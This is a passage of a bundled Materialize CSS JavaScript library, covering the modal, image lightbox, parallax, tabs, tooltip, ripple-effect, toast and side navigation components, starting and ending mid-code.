                                e.$el[0].style.display = "none", "function" == typeof e.options.complete && e.options.complete.call(e, e.$el), e.$overlay[0].parentNode.removeChild(e.$overlay[0])
                            }
                        };
                        this.$el[0].classList.contains("bottom-sheet") ? t(this.$el[0], {
                            bottom: "-100%",
                            opacity: 0
                        }, i) : t(this.$el[0], {
                            top: this.options.startingTop,
                            opacity: 0,
                            scaleX: .7
                        }, i)
                    }
                }, {
                    key: "open",
                    value: function(e) {
                        if (!this.isOpen) {
                            this.isOpen = !0;
                            var t = document.body;
                            return t.style.overflow = "hidden", this.$el[0].classList.add("open"), t.appendChild(this.$overlay[0]), this.openingTrigger = e || void 0, this.options.dismissible && (this.handleKeydownBound = this.handleKeydown.bind(this), document.addEventListener("keydown", this.handleKeydownBound)), this.animateIn(), this
                        }
                    }
                }, {
                    key: "close",
                    value: function() {
                        if (this.isOpen) return this.isOpen = !1, this.$el[0].classList.remove("open"), document.body.style.overflow = "", this.options.dismissible && document.removeEventListener("keydown", this.handleKeydownBound), this.animateOut(), this
                    }
                }], [{
                    key: "init",
                    value: function(t, i) {
                        var o = [];
                        return t.each((function() {
                            o.push(new n(e(this), i))
                        })), o
                    }
                }, {
                    key: "defaults",
                    get: function() {
                        return i
                    }
                }]), n
            }();
        n._increment = 0, n._count = 0, Materialize.Modal = n, e.fn.modal = function(t) {
            return n.prototype[t] ? "get" === t.slice(0, 3) ? this.first()[0].M_Modal[t]() : this.each((function() {
                this.M_Modal[t]()
            })) : "object" != typeof t && t ? void e.error("Method " + t + " does not exist on jQuery.modal") : (n.init(this, arguments[0]), this)
        }
    }(jQuery, Materialize.Vel),
    function(e) {
        e.fn.materialbox = function() {
            return this.each((function() {
                if (!e(this).hasClass("initialized")) {
                    e(this).addClass("initialized");
                    var t, i, n = !1,
                        o = !0,
                        r = 275,
                        s = e(this),
                        a = e("<div></div>").addClass("material-placeholder"),
                        l = s.attr("style");
                    s.wrap(a), s.on("click", (function() {
                        var a = s.parent(".material-placeholder"),
                            l = window.innerWidth,
                            u = window.innerHeight,
                            d = s.width(),
                            p = s.height();
                        if (!1 === o) return c(), !1;
                        if (n && !0 === o) return c(), !1;
                        for (o = !1, s.addClass("active"), n = !0, a.css({
                                width: a[0].getBoundingClientRect().width,
                                height: a[0].getBoundingClientRect().height,
                                position: "relative",
                                top: 0,
                                left: 0
                            }), t = void 0, i = a[0].parentNode; null !== i && !e(i).is(document);) {
                            var f = e(i);
                            "visible" !== f.css("overflow") && (f.css("overflow", "visible"), t = void 0 === t ? f : t.add(f)), i = i.parentNode
                        }
                        s.css({
                            position: "absolute",
                            "z-index": 1e3,
                            "will-change": "left, top, width, height"
                        }).data("width", d).data("height", p);
                        var h = e('<div id="materialbox-overlay"></div>').css({
                            opacity: 0
                        }).click((function() {
                            !0 === o && c()
                        }));
                        s.before(h);
                        var v = h[0].getBoundingClientRect();
                        if (h.css({
                                width: l,
                                height: u,
                                left: -1 * v.left,
                                top: -1 * v.top
                            }), h.velocity({
                                opacity: 1
                            }, {
                                duration: r,
                                queue: !1,
                                easing: "easeOutQuad"
                            }), "" !== s.data("caption")) {
                            var g = e('<div class="materialbox-caption"></div>');
                            g.text(s.data("caption")), e("body").append(g), g.css({
                                display: "inline"
                            }), g.velocity({
                                opacity: 1
                            }, {
                                duration: r,
                                queue: !1,
                                easing: "easeOutQuad"
                            })
                        }
                        var m = 0,
                            y = 0;
                        d / l > p / u ? (m = .9 * l, y = .9 * l * (p / d)) : (m = .9 * u * (d / p), y = .9 * u), s.hasClass("responsive-img") ? s.velocity({
                            "max-width": m,
                            width: d
                        }, {
                            duration: 0,
                            queue: !1,
                            complete: function() {
                                s.css({
                                    left: 0,
                                    top: 0
                                }).velocity({
                                    height: y,
                                    width: m,
                                    left: e(document).scrollLeft() + l / 2 - s.parent(".material-placeholder").offset().left - m / 2,
                                    top: e(document).scrollTop() + u / 2 - s.parent(".material-placeholder").offset().top - y / 2
                                }, {
                                    duration: r,
                                    queue: !1,
                                    easing: "easeOutQuad",
                                    complete: function() {
                                        o = !0
                                    }
                                })
                            }
                        }) : s.css("left", 0).css("top", 0).velocity({
                            height: y,
                            width: m,
                            left: e(document).scrollLeft() + l / 2 - s.parent(".material-placeholder").offset().left - m / 2,
                            top: e(document).scrollTop() + u / 2 - s.parent(".material-placeholder").offset().top - y / 2
                        }, {
                            duration: r,
                            queue: !1,
                            easing: "easeOutQuad",
                            complete: function() {
                                o = !0
                            }
                        }), e(window).on("scroll.materialbox", (function() {
                            n && c()
                        })), e(window).on("resize.materialbox", (function() {
                            n && c()
                        })), e(document).on("keyup.materialbox", (function(e) {
                            27 === e.keyCode && !0 === o && n && c()
                        }))
                    }))
                }

                function c() {
                    o = !1;
                    var i = s.parent(".material-placeholder"),
                        r = (window.innerWidth, window.innerHeight, s.data("width")),
                        a = s.data("height");
                    s.velocity("stop", !0), e("#materialbox-overlay").velocity("stop", !0), e(".materialbox-caption").velocity("stop", !0), e(window).off("scroll.materialbox"), e(document).off("keyup.materialbox"), e(window).off("resize.materialbox"), e("#materialbox-overlay").velocity({
                        opacity: 0
                    }, {
                        duration: 200,
                        queue: !1,
                        easing: "easeOutQuad",
                        complete: function() {
                            n = !1, e(this).remove()
                        }
                    }), s.velocity({
                        width: r,
                        height: a,
                        left: 0,
                        top: 0
                    }, {
                        duration: 200,
                        queue: !1,
                        easing: "easeOutQuad",
                        complete: function() {
                            i.css({
                                height: "",
                                width: "",
                                position: "",
                                top: "",
                                left: ""
                            }), s.removeAttr("style"), s.attr("style", l), s.removeClass("active"), o = !0, t && t.css("overflow", "")
                        }
                    }), e(".materialbox-caption").velocity({
                        opacity: 0
                    }, {
                        duration: 200,
                        queue: !1,
                        easing: "easeOutQuad",
                        complete: function() {
                            e(this).remove()
                        }
                    })
                }
            }))
        }, e(document).ready((function() {
            e(".materialboxed").materialbox()
        }))
    }(jQuery),
    function(e) {
        e.fn.parallax = function() {
            var t = e(window).width();
            return this.each((function(i) {
                var n = e(this);

                function o(i) {
                    var o;
                    o = t < 601 ? n.height() > 0 ? n.height() : n.children("img").height() : n.height() > 0 ? n.height() : 500;
                    var r = n.children("img").first(),
                        s = r.height() - o,
                        a = n.offset().top + o,
                        l = n.offset().top,
                        c = e(window).scrollTop(),
                        u = window.innerHeight,
                        d = (c + u - l) / (o + u),
                        p = Math.round(s * d);
                    i && r.css("display", "block"), a > c && l < c + u && r.css("transform", "translate3D(-50%," + p + "px, 0)")
                }
                n.addClass("parallax"), n.children("img").one("load", (function() {
                    o(!0)
                })).each((function() {
                    this.complete && e(this).trigger("load")
                })), e(window).scroll((function() {
                    t = e(window).width(), o(!1)
                })), e(window).resize((function() {
                    t = e(window).width(), o(!1)
                }))
            }))
        }
    }(jQuery),
    function(e) {
        var t = {
            init: function(t) {
                t = e.extend({
                    onShow: null,
                    swipeable: !1,
                    responsiveThreshold: 1 / 0
                }, t);
                var n = Materialize.objectSelectorString(e(this));
                return this.each((function(i) {
                    var o, r, s, a, l = n + i,
                        c = e(this),
                        u = e(window).width(),
                        d = c.find("li.tab a"),
                        p = c.width(),
                        f = e(),
                        h = Math.max(p, c[0].scrollWidth) / d.length,
                        v = 0,
                        g = 0,
                        m = !1,
                        y = 300,
                        b = function(e) {
                            return Math.ceil(p - e.position().left - e[0].getBoundingClientRect().width - c.scrollLeft())
                        },
                        w = function(e) {
                            return Math.floor(e.position().left + c.scrollLeft())
                        },
                        x = function(e) {
                            v - e >= 0 ? (a.velocity({
                                right: b(o)
                            }, {
                                duration: y,
                                queue: !1,
                                easing: "easeOutQuad"
                            }), a.velocity({
                                left: w(o)
                            }, {
                                duration: y,
                                queue: !1,
                                easing: "easeOutQuad",
                                delay: 90
                            })) : (a.velocity({
                                left: w(o)
                            }, {
                                duration: y,
                                queue: !1,
                                easing: "easeOutQuad"
                            }), a.velocity({
                                right: b(o)
                            }, {
                                duration: y,
                                queue: !1,
                                easing: "easeOutQuad",
                                delay: 90
                            }))
                        };
                    t.swipeable && u > t.responsiveThreshold && (t.swipeable = !1), 0 === (o = e(d.filter('[href="' + location.hash + '"]'))).length && (o = e(this).find("li.tab a.active").first()), 0 === o.length && (o = e(this).find("li.tab a").first()), o.addClass("active"), (v = d.index(o)) < 0 && (v = 0), void 0 !== o[0] && (r = e(o[0].hash)).addClass("active"), c.find(".indicator").length || c.append('<li class="indicator"></li>'), a = c.find(".indicator"), c.append(a), c.is(":visible") && setTimeout((function() {
                        a.css({
                            right: b(o)
                        }), a.css({
                            left: w(o)
                        })
                    }), 0), e(window).off("resize.tabs-" + l).on("resize.tabs-" + l, (function() {
                        p = c.width(), h = Math.max(p, c[0].scrollWidth) / d.length, v < 0 && (v = 0), 0 !== h && 0 !== p && (a.css({
                            right: b(o)
                        }), a.css({
                            left: w(o)
                        }))
                    })), t.swipeable ? (d.each((function() {
                        var t = e(Materialize.escapeHash(this.hash));
                        t.addClass("carousel-item"), f = f.add(t)
                    })), s = f.wrapAll('<div class="tabs-content carousel"></div>'), f.css("display", ""), e(".tabs-content.carousel").carousel({
                        fullWidth: !0,
                        noWrap: !0,
                        onCycleTo: function(e) {
                            if (!m) {
                                var i = v;
                                v = s.index(e), o.removeClass("active"), (o = d.eq(v)).addClass("active"), x(i), "function" == typeof t.onShow && t.onShow.call(c[0], r)
                            }
                        }
                    })) : d.not(o).each((function() {
                        e(Materialize.escapeHash(this.hash)).hide()
                    })), c.off("click.tabs").on("click.tabs", "a", (function(i) {
                        if (e(this).parent().hasClass("disabled")) i.preventDefault();
                        else if (!e(this).attr("target")) {
                            m = !0, p = c.width(), h = Math.max(p, c[0].scrollWidth) / d.length, o.removeClass("active");
                            var n = r;
                            o = e(this), r = e(Materialize.escapeHash(this.hash)), d = c.find("li.tab a"), o.position(), o.addClass("active"), g = v, (v = d.index(e(this))) < 0 && (v = 0), t.swipeable ? f.length && f.carousel("set", v, (function() {
                                "function" == typeof t.onShow && t.onShow.call(c[0], r)
                            })) : (void 0 !== r && (r.show(), r.addClass("active"), "function" == typeof t.onShow && t.onShow.call(this, r)), void 0 === n || n.is(r) || (n.hide(), n.removeClass("active"))), setTimeout((function() {
                                m = !1
                            }), y), x(g), i.preventDefault()
                        }
                    }))
                }))
            },
            select_tab: function(e) {
                this.find('a[href="#' + e + '"]').trigger("click")
            }
        };
        e.fn.tabs = function(i) {
            return t[i] ? t[i].apply(this, Array.prototype.slice.call(arguments, 1)) : "object" != typeof i && i ? void e.error("Method " + i + " does not exist on jQuery.tabs") : t.init.apply(this, arguments)
        }, e(document).ready((function() {
            e("ul.tabs").tabs()
        }))
    }(jQuery),
    function(e) {
        e.fn.tooltip = function(i) {
            return "remove" === i ? (this.each((function() {
                e("#" + e(this).attr("data-tooltip-id")).remove(), e(this).removeAttr("data-tooltip-id"), e(this).off("mouseenter.tooltip mouseleave.tooltip")
            })), !1) : (i = e.extend({
                delay: 350,
                tooltip: "",
                position: "bottom",
                html: !1
            }, i), this.each((function() {
                var n, o, r, s, a, l, c = Materialize.guid(),
                    u = e(this);
                u.attr("data-tooltip-id") && e("#" + u.attr("data-tooltip-id")).remove(), u.attr("data-tooltip-id", c);
                var p, d = function() {
                    n = u.attr("data-html") ? "true" === u.attr("data-html") : i.html, o = void 0 === (o = u.attr("data-delay")) || "" === o ? i.delay : o, r = void 0 === (r = u.attr("data-position")) || "" === r ? i.position : r, s = void 0 === (s = u.attr("data-tooltip")) || "" === s ? i.tooltip : s
                };
                d(), p = e('<div class="material-tooltip"></div>'), s = n ? e("<span></span>").html(s) : e("<span></span>").text(s), p.append(s).appendTo(e("body")).attr("id", c), (l = e('<div class="backdrop"></div>')).appendTo(p), a = p, u.off("mouseenter.tooltip mouseleave.tooltip");
                var f, h = !1;
                u.on({
                    "mouseenter.tooltip": function(e) {
                        f = setTimeout((function() {
                            d(), h = !0, a.velocity("stop"), l.velocity("stop"), a.css({
                                visibility: "visible",
                                left: "0px",
                                top: "0px"
                            });
                            var e, i, n, o, s, c, p = u.outerWidth(),
                                f = u.outerHeight(),
                                v = a.outerHeight(),
                                g = a.outerWidth(),
                                m = "0px",
                                y = "0px",
                                b = l[0].offsetWidth,
                                w = l[0].offsetHeight;
                            "top" === r ? (o = u.offset().top - v - 5, s = u.offset().left + p / 2 - g / 2, c = t(s, o, g, v), m = "-10px", l.css({
                                bottom: 0,
                                left: 0,
                                borderRadius: "14px 14px 0 0",
                                transformOrigin: "50% 100%",
                                marginTop: v,
                                marginLeft: g / 2 - b / 2
                            })) : "left" === r ? (o = u.offset().top + f / 2 - v / 2, s = u.offset().left - g - 5, c = t(s, o, g, v), y = "-10px", l.css({
                                top: "-7px",
                                right: 0,
                                width: "14px",
                                height: "14px",
                                borderRadius: "14px 0 0 14px",
                                transformOrigin: "95% 50%",
                                marginTop: v / 2,
                                marginLeft: g
                            })) : "right" === r ? (o = u.offset().top + f / 2 - v / 2, s = u.offset().left + p + 5, c = t(s, o, g, v), y = "+10px", l.css({
                                top: "-7px",
                                left: 0,
                                width: "14px",
                                height: "14px",
                                borderRadius: "0 14px 14px 0",
                                transformOrigin: "5% 50%",
                                marginTop: v / 2,
                                marginLeft: "0px"
                            })) : (o = u.offset().top + u.outerHeight() + 5, s = u.offset().left + p / 2 - g / 2, c = t(s, o, g, v), m = "+10px", l.css({
                                top: 0,
                                left: 0,
                                marginLeft: g / 2 - b / 2
                            })), a.css({
                                top: c.y,
                                left: c.x
                            }), e = Math.SQRT2 * g / parseInt(b), i = Math.SQRT2 * v / parseInt(w), n = Math.max(e, i), a.velocity({
                                translateY: m,
                                translateX: y
                            }, {
                                duration: 350,
                                queue: !1
                            }).velocity({
                                opacity: 1
                            }, {
                                duration: 300,
                                delay: 50,
                                queue: !1
                            }), l.css({
                                visibility: "visible"
                            }).velocity({
                                opacity: 1
                            }, {
                                duration: 55,
                                delay: 0,
                                queue: !1
                            }).velocity({
                                scaleX: n,
                                scaleY: n
                            }, {
                                duration: 300,
                                delay: 0,
                                queue: !1,
                                easing: "easeInOutQuad"
                            })
                        }), o)
                    },
                    "mouseleave.tooltip": function() {
                        h = !1, clearTimeout(f), setTimeout((function() {
                            !0 !== h && (a.velocity({
                                opacity: 0,
                                translateY: 0,
                                translateX: 0
                            }, {
                                duration: 225,
                                queue: !1
                            }), l.velocity({
                                opacity: 0,
                                scaleX: 1,
                                scaleY: 1
                            }, {
                                duration: 225,
                                queue: !1,
                                complete: function() {
                                    l.css({
                                        visibility: "hidden"
                                    }), a.css({
                                        visibility: "hidden"
                                    }), h = !1
                                }
                            }))
                        }), 225)
                    }
                })
            })))
        };
        var t = function(t, i, n, o) {
            var r = t,
                s = i;
            return r < 0 ? r = 4 : r + n > window.innerWidth && (r -= r + n - window.innerWidth), s < 0 ? s = 4 : s + o > window.innerHeight + e(window).scrollTop && (s -= s + o - window.innerHeight), {
                x: r,
                y: s
            }
        };
        e(document).ready((function() {
            e(".tooltipped").tooltip()
        }))
    }(jQuery),
    function(e) {
        "use strict";
        var t = t || {},
            i = document.querySelectorAll.bind(document);

        function n(e) {
            var t = "";
            for (var i in e) e.hasOwnProperty(i) && (t += i + ":" + e[i] + ";");
            return t
        }
        var o = {
                duration: 750,
                show: function(e, t) {
                    if (2 === e.button) return !1;
                    var i = t || this,
                        r = document.createElement("div");
                    r.className = "waves-ripple", i.appendChild(r);
                    var s, a, l, c, u, d = (c = {
                            top: 0,
                            left: 0
                        }, a = (u = (s = i) && s.ownerDocument).documentElement, void 0 !== s.getBoundingClientRect && (c = s.getBoundingClientRect()), l = function(e) {
                            return null !== (t = e) && t === t.window ? e : 9 === e.nodeType && e.defaultView;
                            var t
                        }(u), {
                            top: c.top + l.pageYOffset - a.clientTop,
                            left: c.left + l.pageXOffset - a.clientLeft
                        }),
                        p = e.pageY - d.top,
                        f = e.pageX - d.left,
                        h = "scale(" + i.clientWidth / 100 * 10 + ")";
                    "touches" in e && (p = e.touches[0].pageY - d.top, f = e.touches[0].pageX - d.left), r.setAttribute("data-hold", Date.now()), r.setAttribute("data-scale", h), r.setAttribute("data-x", f), r.setAttribute("data-y", p);
                    var v = {
                        top: p + "px",
                        left: f + "px"
                    };
                    r.className = r.className + " waves-notransition", r.setAttribute("style", n(v)), r.className = r.className.replace("waves-notransition", ""), v["-webkit-transform"] = h, v["-moz-transform"] = h, v["-ms-transform"] = h, v["-o-transform"] = h, v.transform = h, v.opacity = "1", v["-webkit-transition-duration"] = o.duration + "ms", v["-moz-transition-duration"] = o.duration + "ms", v["-o-transition-duration"] = o.duration + "ms", v["transition-duration"] = o.duration + "ms", v["-webkit-transition-timing-function"] = "cubic-bezier(0.250, 0.460, 0.450, 0.940)", v["-moz-transition-timing-function"] = "cubic-bezier(0.250, 0.460, 0.450, 0.940)", v["-o-transition-timing-function"] = "cubic-bezier(0.250, 0.460, 0.450, 0.940)", v["transition-timing-function"] = "cubic-bezier(0.250, 0.460, 0.450, 0.940)", r.setAttribute("style", n(v))
                },
                hide: function(e) {
                    r.touchup(e);
                    var t = this,
                        i = (t.clientWidth, null),
                        s = t.getElementsByClassName("waves-ripple");
                    if (!(s.length > 0)) return !1;
                    var a = (i = s[s.length - 1]).getAttribute("data-x"),
                        l = i.getAttribute("data-y"),
                        c = i.getAttribute("data-scale"),
                        u = 350 - (Date.now() - Number(i.getAttribute("data-hold")));
                    u < 0 && (u = 0), setTimeout((function() {
                        var e = {
                            top: l + "px",
                            left: a + "px",
                            opacity: "0",
                            "-webkit-transition-duration": o.duration + "ms",
                            "-moz-transition-duration": o.duration + "ms",
                            "-o-transition-duration": o.duration + "ms",
                            "transition-duration": o.duration + "ms",
                            "-webkit-transform": c,
                            "-moz-transform": c,
                            "-ms-transform": c,
                            "-o-transform": c,
                            transform: c
                        };
                        i.setAttribute("style", n(e)), setTimeout((function() {
                            try {
                                t.removeChild(i)
                            } catch (e) {
                                return !1
                            }
                        }), o.duration)
                    }), u)
                },
                wrapInput: function(e) {
                    for (var t = 0; t < e.length; t++) {
                        var i = e[t];
                        if ("input" === i.tagName.toLowerCase()) {
                            var n = i.parentNode;
                            if ("i" === n.tagName.toLowerCase() && -1 !== n.className.indexOf("waves-effect")) continue;
                            var o = document.createElement("i");
                            o.className = i.className + " waves-input-wrapper";
                            var r = i.getAttribute("style");
                            r || (r = ""), o.setAttribute("style", r), i.className = "waves-button-input", i.removeAttribute("style"), n.replaceChild(o, i), o.appendChild(i)
                        }
                    }
                }
            },
            r = {
                touches: 0,
                allowEvent: function(e) {
                    var t = !0;
                    return "touchstart" === e.type ? r.touches += 1 : "touchend" === e.type || "touchcancel" === e.type ? setTimeout((function() {
                        r.touches > 0 && (r.touches -= 1)
                    }), 500) : "mousedown" === e.type && r.touches > 0 && (t = !1), t
                },
                touchup: function(e) {
                    r.allowEvent(e)
                }
            };

        function s(t) {
            var i = function(e) {
                if (!1 === r.allowEvent(e)) return null;
                for (var t = null, i = e.target || e.srcElement; null !== i.parentNode;) {
                    if (!(i instanceof SVGElement) && -1 !== i.className.indexOf("waves-effect")) {
                        t = i;
                        break
                    }
                    i = i.parentNode
                }
                return t
            }(t);
            null !== i && (o.show(t, i), "ontouchstart" in e && (i.addEventListener("touchend", o.hide, !1), i.addEventListener("touchcancel", o.hide, !1)), i.addEventListener("mouseup", o.hide, !1), i.addEventListener("mouseleave", o.hide, !1), i.addEventListener("dragend", o.hide, !1))
        }
        t.displayEffect = function(t) {
            "duration" in (t = t || {}) && (o.duration = t.duration), o.wrapInput(i(".waves-effect")), "ontouchstart" in e && document.body.addEventListener("touchstart", s, !1), document.body.addEventListener("mousedown", s, !1)
        }, t.attach = function(t) {
            "input" === t.tagName.toLowerCase() && (o.wrapInput([t]), t = t.parentNode), "ontouchstart" in e && t.addEventListener("touchstart", s, !1), t.addEventListener("mousedown", s, !1)
        }, e.Waves = t, document.addEventListener("DOMContentLoaded", (function() {
            t.displayEffect()
        }), !1)
    }(window),
    function(e, t) {
        "use strict";
        var i = {
                displayLength: 1 / 0,
                inDuration: 300,
                outDuration: 375,
                className: void 0,
                completeCallback: void 0,
                activationPercent: .8
            },
            n = function() {
                function n(t, i, o, r) {
                    if (_classCallCheck(this, n), t) {
                        this.options = {
                            displayLength: i,
                            className: o,
                            completeCallback: r
                        }, this.options = e.extend({}, n.defaults, this.options), this.message = t, this.panning = !1, this.timeRemaining = this.options.displayLength, 0 === n._toasts.length && n._createContainer(), n._toasts.push(this);
                        var s = this.createToast();
                        s.M_Toast = this, this.el = s, this._animateIn(), this.setTimer()
                    }
                }
                return _createClass(n, [{
                    key: "createToast",
                    value: function() {
                        var t = document.createElement("div");
                        if (t.classList.add("toast"), this.options.className) {
                            var i, o = this.options.className.split(" "),
                                r = void 0;
                            for (r = 0, i = o.length; r < i; r++) t.classList.add(o[r])
                        }
                        return ("object" == typeof HTMLElement ? this.message instanceof HTMLElement : this.message && "object" == typeof this.message && null !== this.message && 1 === this.message.nodeType && "string" == typeof this.message.nodeName) ? t.appendChild(this.message) : this.message instanceof jQuery ? e(t).append(this.message) : t.innerHTML = this.message, n._container.appendChild(t), t
                    }
                }, {
                    key: "_animateIn",
                    value: function() {
                        t(this.el, {
                            top: 0,
                            opacity: 1
                        }, {
                            duration: 300,
                            easing: "easeOutCubic",
                            queue: !1
                        })
                    }
                }, {
                    key: "setTimer",
                    value: function() {
                        var e = this;
                        this.timeRemaining !== 1 / 0 && (this.counterInterval = setInterval((function() {
                            e.panning || (e.timeRemaining -= 20), e.timeRemaining <= 0 && e.remove()
                        }), 20))
                    }
                }, {
                    key: "remove",
                    value: function() {
                        var e = this;
                        window.clearInterval(this.counterInterval);
                        var i = this.el.offsetWidth * this.options.activationPercent;
                        this.wasSwiped && (this.el.style.transition = "transform .05s, opacity .05s", this.el.style.transform = "translateX(" + i + "px)", this.el.style.opacity = 0), t(this.el, {
                            opacity: 0,
                            marginTop: "-40px"
                        }, {
                            duration: this.options.outDuration,
                            easing: "easeOutExpo",
                            queue: !1,
                            complete: function() {
                                "function" == typeof e.options.completeCallback && e.options.completeCallback(), e.el.parentNode.removeChild(e.el), n._toasts.splice(n._toasts.indexOf(e), 1), 0 === n._toasts.length && n._removeContainer()
                            }
                        })
                    }
                }], [{
                    key: "_createContainer",
                    value: function() {
                        var e = document.createElement("div");
                        e.setAttribute("id", "toast-container"), e.addEventListener("touchstart", n._onDragStart), e.addEventListener("touchmove", n._onDragMove), e.addEventListener("touchend", n._onDragEnd), e.addEventListener("mousedown", n._onDragStart), document.addEventListener("mousemove", n._onDragMove), document.addEventListener("mouseup", n._onDragEnd), document.body.appendChild(e), n._container = e
                    }
                }, {
                    key: "_removeContainer",
                    value: function() {
                        document.removeEventListener("mousemove", n._onDragMove), document.removeEventListener("mouseup", n._onDragEnd), n._container.parentNode.removeChild(n._container), n._container = null
                    }
                }, {
                    key: "_onDragStart",
                    value: function(t) {
                        if (t.target && e(t.target).closest(".toast").length) {
                            var i = e(t.target).closest(".toast")[0].M_Toast;
                            i.panning = !0, n._draggedToast = i, i.el.classList.add("panning"), i.el.style.transition = "", i.startingXPos = n._xPos(t), i.time = Date.now(), i.xPos = n._xPos(t)
                        }
                    }
                }, {
                    key: "_onDragMove",
                    value: function(e) {
                        if (n._draggedToast) {
                            e.preventDefault();
                            var t = n._draggedToast;
                            t.deltaX = Math.abs(t.xPos - n._xPos(e)), t.xPos = n._xPos(e), t.velocityX = t.deltaX / (Date.now() - t.time), t.time = Date.now();
                            var i = t.xPos - t.startingXPos,
                                o = t.el.offsetWidth * t.options.activationPercent;
                            t.el.style.transform = "translateX(" + i + "px)", t.el.style.opacity = 1 - Math.abs(i / o)
                        }
                    }
                }, {
                    key: "_onDragEnd",
                    value: function(e) {
                        if (n._draggedToast) {
                            var t = n._draggedToast;
                            t.panning = !1, t.el.classList.remove("panning");
                            var i = t.xPos - t.startingXPos,
                                o = t.el.offsetWidth * t.options.activationPercent;
                            Math.abs(i) > o || t.velocityX > 1 ? (t.wasSwiped = !0, t.remove()) : (t.el.style.transition = "transform .2s, opacity .2s", t.el.style.transform = "", t.el.style.opacity = ""), n._draggedToast = null
                        }
                    }
                }, {
                    key: "_xPos",
                    value: function(e) {
                        return e.targetTouches && e.targetTouches.length >= 1 ? e.targetTouches[0].clientX : e.clientX
                    }
                }, {
                    key: "removeAll",
                    value: function() {
                        for (var e in n._toasts) n._toasts[e].remove()
                    }
                }, {
                    key: "defaults",
                    get: function() {
                        return i
                    }
                }]), n
            }();
        n._toasts = [], n._container = null, n._draggedToast = null, Materialize.Toast = n, Materialize.toast = function(e, t, i, o) {
            return new n(e, t, i, o)
        }
    }(jQuery, Materialize.Vel),
    function(e) {
        var t = {
            init: function(t) {
                t = e.extend({
                    menuWidth: 300,
                    edge: "left",
                    closeOnClick: !1,
                    draggable: !1,
                    onOpen: null,
                    onClose: null
                }, t), e(this).each((function() {
                    var i = e(this),
                        n = i.attr("data-activates"),
                        o = e("#" + n);
                    300 != t.menuWidth && o.css("width", t.menuWidth);
                    var r = e('.drag-target[data-sidenav="' + n + '"]');
                    t.draggable ? (r.length && r.remove(), r = e('<div class="drag-target"></div>').attr("data-sidenav", n), e("body").append(r)) : r = e(), "left" == t.edge ? (o.css("transform", "translateX(-100%)"), r.css({
                        left: 0
                    })) : (o.addClass("right-aligned").css("transform", "translateX(100%)"), r.css({
                        right: 0
                    })), o.hasClass("fixed") && window.innerWidth > 992 && o.css("transform", "translateX(0)"), o.hasClass("fixed") && e(window).resize((function() {
                        window.innerWidth > 992 ? 0 !== e("#sidenav-overlay").length && a ? s(!0) : o.css("transform", "translateX(0%)") : !1 === a && ("left" === t.edge ? o.css("transform", "translateX(-100%)") : o.css("transform", "translateX(100%)"))
                    })), !0 === t.closeOnClick && o.on("click.itemclick", "a:not(.collapsible-header)", (function() {
                        window.innerWidth > 992 && o.hasClass("fixed") || s()
                    }));
                    var s = function(i) {
                            a = !1, e("body").css({
                                overflow: "",
                                width: ""
                            }), e("#sidenav-overlay").velocity({
                                opacity: 0
                            }, {
                                duration: 200,
                                queue: !1,
                                easing: "easeOutQuad",
                                complete: function() {
                                    e(this).remove()
                                }
                            }), "left" === t.edge ? (r.css({
                                width: "",
                                right: "",
                                left: "0"
                            }), o.velocity({
                                translateX: "-100%"
                            }, {
                                duration: 200,
                                queue: !1,
                                easing: "easeOutCubic",
                                complete: function() {
                                    !0 === i && (o.removeAttr("style"), o.css("width", t.menuWidth))
                                }
                            })) : (r.css({
                                width: "",
                                right: "0",
                                left: ""
                            }), o.velocity({
                                translateX: "100%"
                            }, {
                                duration: 200,
                                queue: !1,
                                easing: "easeOutCubic",
                                complete: function() {
                                    !0 === i && (o.removeAttr("style"), o.css("width", t.menuWidth))
                                }
                            })), "function" == typeof t.onClose && t.onClose.call(this, o)
                        },
                        a = !1;
                    t.draggable && (r.on("click", (function() {
                        a && s()
                    })), r.hammer({
                        prevent_default: !1
                    }).on("pan", (function(i) {
                        if ("touch" == i.gesture.pointerType) {
                            i.gesture.direction;
                            var n = i.gesture.center.x,
                                r = i.gesture.center.y;
                            if (i.gesture.velocityX, 0 === n && 0 === r) return;
                            var l, c = e("body"),
                                u = e("#sidenav-overlay"),
                                d = c.innerWidth();
                            if (c.css("overflow", "hidden"), c.width(d), 0 === u.length && ((u = e('<div id="sidenav-overlay"></div>')).css("opacity", 0).click((function() {
                                    s()
                                })), "function" == typeof t.onOpen && t.onOpen.call(this, o), e("body").append(u)), "left" === t.edge && (n > t.menuWidth ? n = t.menuWidth : n < 0 && (n = 0)), "left" === t.edge) n < t.menuWidth / 2 ? a = !1 : n >= t.menuWidth / 2 && (a = !0), o.css("transform", "translateX(" + (n - t.menuWidth) + "px)");
                            else {
                                n < window.innerWidth - t.menuWidth / 2 ? a = !0 : n >= window.innerWidth - t.menuWidth / 2 && (a = !1);
                                var p = n - t.menuWidth / 2;
                                p < 0 && (p = 0), o.css("transform", "translateX(" + p + "px)")
                            }
                            "left" === t.edge ? (l = n / t.menuWidth, u.velocity({
                                opacity: l
                            }, {
                                duration: 10,
                                queue: !1,
                                easing: "easeOutQuad"
                            })) : (l = Math.abs((n - window.innerWidth) / t.menuWidth), u.velocity({
                                opacity: l
                            }, {
                                duration: 10,
                                queue: !1,
                                easing: "easeOutQuad"
                            }))
                        }
                    })).on("panend", (function(i) {
                        if ("touch" == i.gesture.pointerType) {
                            var n = e("#sidenav-overlay"),
                                s = i.gesture.velocityX,
                                l = i.gesture.center.x,
                                c = l - t.menuWidth,
                                u = l - t.menuWidth / 2;
                            c > 0 && (c = 0), u < 0 && (u = 0), "left" === t.edge ? a && s <= .3 || s < -.5 ? (0 !== c && o.velocity({
                                translateX: [0, c]
                            }, {
                                duration: 300,
                                queue: !1,
                                easing: "easeOutQuad"
                            }), n.velocity({
                                opacity: 1
                            }, {
                                duration: 50,
                                queue: !1,
                                easing: "easeOutQuad"
                            }), r.css({
                                width: "50%",
                                right: 0,
                                left: ""
                            }), a = !0) : (!a || s > .3) && (e("body").css({
                                overflow: "",
                                width: ""
                            }), o.velocity({
                                translateX: [-1 * t.menuWidth - 10, c]
                            }, {
                                duration: 200,
                                queue: !1,
                                easing: "easeOutQuad"
                            }), n.velocity({
                                opacity: 0
                            }, {
                                duration: 200,
                                queue: !1,
                                easing: "easeOutQuad",
                                complete: function() {
                                    "function" == typeof t.onClose && t.onClose.call(this, o), e(this).remove()
                                }
                            }), r.css({
                                width: "10px",
                                right: "",
                                left: 0
                            })) : a && s >= -.3 || s > .5 ? (0 !== u && o.velocity({
                                translateX: [0, u]
                            }, {
                                duration: 300,
                                queue: !1,
                                easing: "easeOutQuad"
                            }), n.velocity({
                                opacity: 1
                            }, {
                                duration: 50,
                                queue: !1,
                                easing: "easeOutQuad"
                            }), r.css({
                                width: "50%",
